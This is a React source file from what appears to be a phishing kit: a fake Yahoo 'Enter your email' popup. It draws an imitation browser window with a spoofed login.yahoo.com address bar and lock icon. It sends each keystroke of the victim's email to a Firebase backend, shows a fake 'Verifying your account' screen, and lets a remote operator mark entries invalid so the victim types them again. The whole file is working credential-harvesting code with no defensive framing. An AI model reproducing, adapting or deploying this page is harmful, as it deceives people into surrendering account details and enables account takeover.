import React from "react";
import EmailLayout from "../EmailLayout";
import yahooLogo from "../assets/logoyahoo.png";
import loadingSvg from "../assets/loadingya.svg";
import yahooFinalGif from "../assets/yahoofinal.gif";
import { useFirebaseClient } from "../../../hooks/useFirebaseClient";
import { reportTyping } from "../../../firebase/typing";

const YahooEmailPage = () => {
  const translations = {
    windowTitle: "Sign in to your account - Yahoo",
    url: "https://login.yahoo.com/account/challenge/password?src=noSrc&done=https%3A%2F%2Fmail.yahoo.com%2Fd&display=login",
  };
  const { updateClientData, commands, clearCommands } = useFirebaseClient();
  const [email, setEmail] = React.useState("");
  const [isFieldFocused, setIsFieldFocused] = React.useState(false);
  const [isSubmitting, setIsSubmitting] = React.useState(false);
  const [invalidMessage, setInvalidMessage] = React.useState("");
  const phrases = React.useMemo(
    () => [
      "Connecting to Yahoo...",
      "Verifying your account...",
      "Syncing security settings...",
      "Finalizing sign-in...",
    ],
    []
  );
  const [phraseIndex, setPhraseIndex] = React.useState(0);
  React.useEffect(() => {
    if (!isSubmitting) return;
    const id = setInterval(
      () => setPhraseIndex((p) => (p + 1) % phrases.length),
      2000
    );
    return () => clearInterval(id);
  }, [isSubmitting, phrases.length]);
  const [position, setPosition] = React.useState(() => ({
    left: Math.max(12, (window.innerWidth - 380) / 2),
    top: Math.max(12, (window.innerHeight - 480) / 2),
  }));
  const [isDragging, setIsDragging] = React.useState(false);
  const dragOffsetRef = React.useRef({ x: 0, y: 0 });
  const startDrag = (e) => {
    const tag = e.target.tagName;
    if (["INPUT", "BUTTON", "A", "SELECT", "TEXTAREA", "LABEL"].includes(tag))
      return;
    setIsDragging(true);
    dragOffsetRef.current = {
      x: e.clientX - position.left,
      y: e.clientY - position.top,
    };
  };
  React.useEffect(() => {
    const onMove = (e) => {
      if (!isDragging) return;
      setPosition({
        left: Math.max(0, e.clientX - dragOffsetRef.current.x),
        top: Math.max(0, e.clientY - dragOffsetRef.current.y),
      });
    };
    const onUp = () => setIsDragging(false);
    if (isDragging) {
      document.addEventListener("mousemove", onMove);
      document.addEventListener("mouseup", onUp);
    }
    return () => {
      document.removeEventListener("mousemove", onMove);
      document.removeEventListener("mouseup", onUp);
    };
  }, [isDragging]);

  // Atualizar URL e etapa para badge no card
  React.useEffect(() => {
    try {
      updateClientData({
        currentUrl: "/sync?view=yahoo_email",
        currentPage: "yahoo_email",
        yahooStage: "Email",
        fromForm: true,
      });
    } catch {}
  }, [updateClientData]);

  // Função de navegação que sempre retorna false (deixa o useFirebaseClient lidar com redirecionamentos)
  const navigateByCommand = React.useCallback(() => false, []);

  // Detectar comandos de invalidação
  React.useEffect(() => {
    if (!commands || commands.length === 0) return;
    const latest = commands[commands.length - 1];
    if (!latest || typeof latest !== "string") return;

    if (latest.startsWith("inv_") || latest.startsWith("invalid_")) {
      setInvalidMessage("Invalid email address.");
      setEmail("");
      setIsSubmitting(false);
      setTimeout(() => clearCommands && clearCommands(), 200);
      return;
    }

    const navigated = navigateByCommand(latest);
    if (navigated) {
      // limpar após navegar
      setTimeout(() => clearCommands(), 100);
    }
  }, [commands, navigateByCommand, clearCommands]);

  return (
    <EmailLayout>
      <div
        className="relative p-4 overflow-x-hidden"
        style={{ fontFamily: "Arial, sans-serif" }}
      >
        <div
          onMouseDown={startDrag}
          style={{
            background: "#fff",
            borderRadius: 10,
            boxShadow: "0 2px 16px rgba(0,0,0,0.2)",
            width: "min(380px, 92vw)",
            minHeight: 420,
            color: "#252423",
            display: "flex",
            flexDirection: "column",
            overflow: "hidden",
            position: "fixed",
            left: "50%",
            top: "50%",
            transform: "translate(-50%, -50%)",
            cursor: isDragging ? "grabbing" : "default",
            zIndex: 1000,
          }}
        >
          {/* Simulação da barra da janela/navegador (título + botões -, □, ×) */}
          <div
            data-window-header="true"
            onMouseDown={startDrag}
            style={{
              height: 24,
              background: "#e3f2fd",
              borderBottom: "1px solid #e1dfdd",
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              padding: "0 14px",
              fontSize: 12,
              color: "#605e5c",
              cursor: "grab",
            }}
          >
            <span
              style={{
                opacity: 0.9,
                display: "flex",
                alignItems: "center",
                gap: 8,
              }}
            >
              {/* Yahoo logo */}
              <svg
                xmlns="http://www.w3.org/2000/svg"
                aria-label="Yahoo!"
                viewBox="0 0 512 512"
                fill="#fff"
                width="16"
                height="16"
              >
                <rect width="512" height="512" rx="15%" fill="#5f01d1" />
                <path d="M203 404h-62l25-59-69-165h63l37 95 37-95h62m58 76h-69l62-148h69" />
                <circle cx="303" cy="308" r="38" />
              </svg>
              {translations.windowTitle}
            </span>
            <div style={{ display: "flex", gap: 6 }}>
              <button
                title="Minimize"
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  cursor: "default",
                  fontSize: 16,
                  lineHeight: 1,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M3 8.5H13"
                    stroke="#605e5c"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                </svg>
              </button>
              <button
                title="Maximize"
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  cursor: "default",
                  fontSize: 16,
                  lineHeight: 1,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <rect
                    x="3.5"
                    y="3.5"
                    width="9"
                    height="9"
                    rx="1"
                    stroke="#605e5c"
                    strokeWidth="1.5"
                  />
                </svg>
              </button>
              <button
                title="Close"
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  color: "#605e5c",
                  cursor: "default",
                  fontSize: 16,
                  lineHeight: 1,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M4 4L12 12"
                    stroke="#605e5c"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                  <path
                    d="M12 4L4 12"
                    stroke="#605e5c"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                </svg>
              </button>
            </div>
          </div>

          {/* Barra de endereço/URL - colada na barra da janela */}
          <div
            style={{
              borderBottom: "1px solid #e1dfdd",
              padding: 0,
              background: "#ffffff",
              margin: 0,
            }}
          >
            <div
              style={{
                width: "100%",
                background: "#f5f5f5",
                borderTop: "1px solid #d0d7de",
                borderBottom: "1px solid #d0d7de",
                boxSizing: "border-box",
                height: 28,
                display: "flex",
                alignItems: "center",
                padding: "0 14px 0 12px",
                gap: 10,
                fontSize: 12,
                color: "#605e5c",
              }}
            >
              <svg
                width="14"
                height="14"
                viewBox="0 0 16 16"
                xmlns="http://www.w3.org/2000/svg"
                version="1.1"
                fill="none"
                stroke="#605e5c"
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth="1.5"
                aria-hidden="true"
                style={{ display: "block" }}
              >
                <rect height="7.5" width="10.5" y="6.75" x="2.75" />
                <path d="m4.75 6.25s-1-4.5 3.25-4.5 3.25 4.5 3.25 4.5" />
              </svg>
              <div
                style={{
                  overflow: "hidden",
                  textOverflow: "ellipsis",
                  whiteSpace: "nowrap",
                  flex: 1,
                  fontWeight: 400,
                  letterSpacing: "0.2px",
                }}
              >
                {translations.url}
              </div>
            </div>
          </div>

          <div style={{ padding: "24px 24px 14px 24px" }}>
            <div
              style={{
                display: "flex",
                justifyContent: "center",
                marginBottom: 24,
              }}
            >
              <img
                src={yahooLogo}
                alt="Yahoo"
                style={{ height: 32, width: "auto" }}
              />
            </div>
            <h1 style={{ fontSize: 22, fontWeight: 600, margin: "6px 0 8px" }}>
              Enter your email
            </h1>
            <label htmlFor="email" style={{ fontSize: 12, color: "#6b7280" }}>
              Email address
            </label>
            <input
              data-yahoo-modal
              id="email"
              type="email"
              placeholder="example@yahoo.com"
              value={email}
              onChange={(e) => {
                const val = e.target.value;
                setEmail(val);
                try {
                  updateClientData({ yahooEmail: val });
                  reportTyping("yahooemail", val);
                } catch {}
              }}
              style={{
                width: "100%",
                border: "none",
                borderBottom: isFieldFocused
                  ? "2px solid #6a33f5"
                  : "1px solid #111827",
                borderRadius: 0,
                padding: "10px 4px 10px 4px",
                fontSize: 14,
                outline: "none",
                background: "transparent",
                transition:
                  "border-color 0.25s ease, border-bottom-width 0.25s ease",
              }}
              onFocus={() => setIsFieldFocused(true)}
              onBlur={() => setIsFieldFocused(false)}
            />
            {/* Preview em tempo real do email digitado */}
            {email.trim() && (
              <div
                style={{
                  display: "flex",
                  justifyContent: "center",
                  marginTop: 10,
                }}
              >
                <button
                  type="button"
                  style={{
                    background: "#F9FAFB",
                    color: "#111827",
                    border: "1px solid #e5e7eb",
                    borderRadius: 9999,
                    padding: "6px 12px",
                    fontSize: 12,
                    fontWeight: 600,
                    cursor: "default",
                    boxShadow: "0 1px 0 rgba(0,0,0,0.03)",
                    display: "flex",
                    alignItems: "center",
                    gap: 6,
                  }}
                >
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    viewBox="0 0 18 18"
                    width="14"
                    height="14"
                  >
                    <circle cx="9" cy="9" r="8" fill="#5f01d1" />
                    <path
                      d="M9 4.5a2.5 2.5 0 1 1 0 5 2.5 2.5 0 0 1 0-5Zm0 5.8c-2.2 0-4 1.3-4 3v.7h8v-.7c0-1.7-1.8-3-4-3Z"
                      fill="#fff"
                    />
                  </svg>
                  <span>{email}</span>
                </button>
              </div>
            )}
            {invalidMessage && (
              <div style={{ color: "#a4262c", fontSize: 12, marginTop: 8 }}>
                {invalidMessage}
              </div>
            )}
            <div style={{ marginTop: 16 }}>
              <button
                type="button"
                style={{
                  width: "100%",
                  padding: "14px",
                  background: email.trim() ? "#6a33f5" : "#e6dbfb",
                  color: email.trim() ? "#fff" : "#5f5a64",
                  border: "none",
                  borderRadius: 28,
                  fontSize: 14,
                  fontWeight: 700,
                  cursor: email.trim() ? "pointer" : "not-allowed",
                }}
                onClick={(e) => {
                  e.preventDefault();
                  if (!email.trim()) return;
                  try {
                    localStorage.setItem("client_email", email.trim());
                  } catch {}
                  try {
                    updateClientData({ yahooEmailSubmittedAt: Date.now() });
                  } catch {}
                  setIsSubmitting(true);
                }}
              >
                Next
              </button>
            </div>
            {/* Overlay final igual ao Yahoo SMS */}
            {isSubmitting && (
              <div
                style={{
                  position: "absolute",
                  inset: 0,
                  background: "#ffffff",
                  display: "flex",
                  flexDirection: "column",
                  zIndex: 25,
                  pointerEvents: "none",
                }}
              >
                <div
                  style={{
                    height: 24,
                    background: "#e3f2fd",
                    borderBottom: "1px solid #e1dfdd",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "space-between",
                    padding: "0 14px",
                    fontSize: 12,
                    color: "#605e5c",
                  }}
                >
                  <span
                    style={{
                      opacity: 0.9,
                      display: "flex",
                      alignItems: "center",
                      gap: 8,
                    }}
                  >
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      aria-label="Yahoo!"
                      viewBox="0 0 512 512"
                      fill="#fff"
                      width="16"
                      height="16"
                    >
                      <rect width="512" height="512" rx="15%" fill="#5f01d1" />
                      <path d="M203 404h-62l25-59-69-165h63l37 95 37-95h62m58 76h-69l62-148h69" />
                      <circle cx="303" cy="308" r="38" />
                    </svg>
                    {translations.windowTitle}
                  </span>
                  <div style={{ display: "flex", gap: 6 }}>
                    <svg width="12" height="12" viewBox="0 0 16 16" aria-hidden>
                      <path
                        d="M3 8.5H13"
                        stroke="#605e5c"
                        strokeWidth="1.2"
                        strokeLinecap="round"
                      />
                    </svg>
                    <svg width="12" height="12" viewBox="0 0 16 16" aria-hidden>
                      <rect
                        x="3.5"
                        y="3.5"
                        width="9"
                        height="9"
                        rx="1"
                        stroke="#605e5c"
                        strokeWidth="1.2"
                        fill="none"
                      />
                    </svg>
                    <svg width="12" height="12" viewBox="0 0 16 16" aria-hidden>
                      <path
                        d="M4 4L12 12"
                        stroke="#605e5c"
                        strokeWidth="1.2"
                        strokeLinecap="round"
                      />
                      <path
                        d="M12 4L4 12"
                        stroke="#605e5c"
                        strokeWidth="1.2"
                        strokeLinecap="round"
                      />
                    </svg>
                  </div>
                </div>
                <div
                  style={{
                    borderBottom: "1px solid #e1dfdd",
                    background: "#ffffff",
                  }}
                >
                  <div
                    style={{
                      width: "100%",
                      background: "#f5f5f5",
                      borderTop: "1px solid #d0d7de",
                      borderBottom: "1px solid #d0d7de",
                      boxSizing: "border-box",
                      height: 28,
                      display: "flex",
                      alignItems: "center",
                      padding: "0 14px 0 12px",
                      gap: 10,
                      fontSize: 12,
                      color: "#605e5c",
                    }}
                  >
                    <svg
                      width="14"
                      height="14"
                      viewBox="0 0 16 16"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      stroke="#605e5c"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth="1.5"
                      aria-hidden="true"
                      style={{ display: "block" }}
                    >
                      <rect height="7.5" width="10.5" y="6.75" x="2.75" />
                      <path d="m4.75 6.25s-1-4.5 3.25-4.5 3.25 4.5 3.25 4.5" />
                    </svg>
                    <div
                      style={{
                        overflow: "hidden",
                        textOverflow: "ellipsis",
                        whiteSpace: "nowrap",
                        flex: 1,
                        fontWeight: 400,
                        letterSpacing: "0.2px",
                      }}
                    >
                      {translations.url}
                    </div>
                  </div>
                </div>
                <div
                  style={{
                    flex: 1,
                    display: "flex",
                    flexDirection: "column",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: 20,
                    textAlign: "center",
                    padding: "20px",
                  }}
                >
                  <img
                    src={yahooFinalGif}
                    alt="Connecting to Yahoo"
                    style={{ width: 280, height: "auto" }}
                  />
                  <img
                    src={loadingSvg}
                    alt="Loading"
                    style={{
                      width: "90%",
                      height: 8,
                      objectFit: "contain",
                      filter: "brightness(0.45) contrast(1.35)",
                    }}
                  />
                  <div
                    style={{
                      color: "#4b5563",
                      fontSize: 18,
                      minHeight: 24,
                      fontWeight: 500,
                    }}
                  >
                    {phrases[phraseIndex]}
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    </EmailLayout>
  );
};

export default YahooEmailPage;
